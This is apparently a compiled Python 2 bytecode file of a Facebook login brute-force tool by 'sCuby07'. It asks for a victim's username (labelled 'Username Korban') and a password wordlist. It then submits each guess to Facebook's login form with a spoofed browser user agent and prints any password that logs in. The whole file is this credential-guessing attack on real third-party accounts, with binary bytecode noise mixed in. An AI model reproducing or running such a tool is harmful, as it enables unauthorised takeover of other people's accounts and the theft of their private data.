ó
ýÜ^c           @   s  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z y d  d l Z Wn e k
 rx e  j d  n Xd Z	 d Z
 d Z d Z d Z d Z d	 Z d
 Z d Z d Z d Z d   Z d Z e  j d  e GHe e d j e
 e e
 e e    Z e e d j e
 e e
 e e    Z d Z d g Z d   Z d   Z d   Z d   Z  d   Z! e" d k r|e   n  d S(   iÿÿÿÿNs   pip2 install mechanizes   [0;32ms   [32;1ms   [0;36ms   [35;1ms   [36;1ms   [34;1ms   [31;1ms   [37;1ms   [30;1ms   [33;1ms   [1;33mc         C   sG   x@ |  d D]4 } t  j j |  t  j j   t j d d  q Wd  S(   Ns   
g      $@id   (   t   syst   stdoutt   writet   flusht   timet   sleep(   t   st   c(    (    s   /sdcard/force.pyt   runntek   s    s+  [36;1m
ââ â¦âââ¦ â¦ââ¦âââââââââââ¦ââââââââ
â â©ââ â¦ââ â â ââ£ â â£ â ââ â¦ââ  ââ£
ââââ©âââââ â© ââââ  ââââ©ââââââââ
[101m[37;1m::    Created By sCuby07    ::[;0m
t   clears!   
{}[{}+{}]{} Username Korban{} : s    {}[{}+{}]{} Username Korban{} : s2   https://www.facebook.com/login.php?login_attempt=1sD   Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0c          C   s¡   t  j   a t j   }  t j t  t j t  t j	 |   t j
 t  t j t  t j t  j j   d d t   t   t   t d j t   d  S(   Nt   max_timei   s4   {}Password Kaga Ada Yang Nyantol Gan
Bikin Lagi Sono(   t	   mechanizet   Browsert   brt	   cookielibt   LWPCookieJart   set_handle_robotst   Falset   set_handle_redirectt   Truet   set_cookiejart   set_handle_equivt   set_handle_referert   set_handle_refresht   _httpt   HTTPRefreshProcessort   cobat   lanjutt   cariR   t   formatt   R(   t   cj(    (    s   /sdcard/force.pyt   main-   s    c         C   s  yâ t  j j d j t t |    t  j j   d t f g t _	 t j
 t  } t j d d  t t j d <|  t j d <t j   } | j   } | t k rá d | k rá d j t t |   GHt d	 j t   t  j d
  n  Wn" t j k
 rd j t  GHn Xd  S(   Ns   {}Mencoba {}{}s
   User-agentt   nri    t   emailt   passt   login_attempts   {}Password : {}{}s   {}TEKAN ENTER UNTUK KELUARi   s   {}Koneksi Error(   R    R   R   R   t   WR   R   t   uaR   t
   addheaderst   opent   logint   select_formt   mailt   formt   submitt   geturlt   GLt   BLt	   raw_inputt   exitt   urllib2t   URLError(   t   passwordt   sitet   subt   log(    (    s   /sdcard/force.pyt   brute<   s     c          C   s@   t  t d  }  x* |  D]" a t j d d  }  t t  q Wd  S(   Nt   rs   
t    (   R(   t   paswR5   t   replaceR9   (   t	   passwords(    (    s   /sdcard/force.pyR   N   s    c           C   s   d j  t t t  GHd  S(   Ns%  {}
ââââââââââââââââââââââââââââââââââââââââ
â       {} Trying To Get Password       {} â
ââââââââââââââââââââââââââââââââââââââââ(   R   R%   R   (    (    (    s   /sdcard/force.pyR   U   s    c          C   sN   t  t d  }  |  j   }  d j t t t  GHt d Gt |   Gt d GHd  S(   NR:   s   {}
Account To Crack :{} {}s   Jumlah Wordlist  :s	   Password
(   R(   R<   t	   readlinesR   R%   R   R+   t   len(   t   total(    (    s   /sdcard/force.pyR   Y   s    t   __main__(#   t   osR    R   t   randomR   R3   R   t   KeyErrort   systemt   GR/   t   Bt   PR0   t   BDR   R%   t   Ht   Yt   YLR   t   logot   strR1   R   R+   R<   R)   R&   R    R9   R   R   R   t   __name__(    (    (    s   /sdcard/force.pyt   <module>   s<   H	
''						